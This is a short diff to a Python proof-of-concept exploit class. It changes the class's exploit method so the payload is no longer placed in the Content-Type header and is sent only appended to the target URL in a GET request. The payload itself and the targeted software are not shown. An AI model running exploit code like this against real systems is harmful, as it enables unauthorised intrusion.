@@ -20,7 +20,7 @@ class poc(object):
     
     def exploit(self, target):
         
-        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:52.0)','Content-Type': self.payload}
+        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:52.0)'}
         try:
             
             res = requests.get(target+self.payload, headers=headers, timeout=30)
